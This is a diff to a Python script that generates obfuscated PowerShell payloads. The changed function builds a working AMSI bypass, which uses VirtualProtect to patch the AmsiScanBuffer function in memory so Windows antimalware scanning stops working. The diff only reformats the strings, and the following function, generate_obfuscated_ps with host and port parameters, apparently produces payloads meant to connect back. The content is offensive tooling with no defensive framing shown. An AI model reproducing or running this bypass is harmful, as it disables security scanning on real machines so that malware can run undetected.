@@ -40,18 +40,25 @@ def amsi_bypass_variants(var):
     )
     variant3 = (
         f"{junk_code()}"
-        "$w = @'\nusing System;\nusing System.Runtime.InteropServices;\n"
-        "public class Win32 {\n"
-        "[DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n"
-        "[DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name);\n"
-        "[DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n"
-        "}\n'@\n"
-        "Add-Type $w\n"
-        "$a = [Win32]::GetProcAddress([Win32]::LoadLibrary('amsi.dll'), 'AmsiScanBuffer')\n"
-        "[Win32]::VirtualProtect($a, [UIntPtr]5, 0x40, [ref]0) | Out-Null\n"
-        "[Byte[]]$p = 0xB8,0x57,0x00,0x07,0x80\n"
-        "[System.Runtime.InteropServices.Marshal]::Copy($p, 0, $a, 5)"
+        '$code = @"\n'
+        'using System;\n'
+        'using System.Runtime.InteropServices;\n'
+        'public class Win32 {\n'
+        '    [DllImport("kernel32")]\n'
+        '    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n'
+        '    [DllImport("kernel32")]\n'
+        '    public static extern IntPtr LoadLibrary(string name);\n'
+        '    [DllImport("kernel32")]\n'
+        '    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n'
+        '}\n'
+        '"@\n'
+        'Add-Type -TypeDefinition $code\n'
+        '$a = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")\n'
+        '[Win32]::VirtualProtect($a, [UIntPtr]5, 0x40, [ref]0) | Out-Null\n'
+        '[Byte[]]$p = 0xB8,0x57,0x00,0x07,0x80\n'
+        '[System.Runtime.InteropServices.Marshal]::Copy($p, 0, $a, 5)'
     )
+
     return [variant1, variant2, variant3]
 
 def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
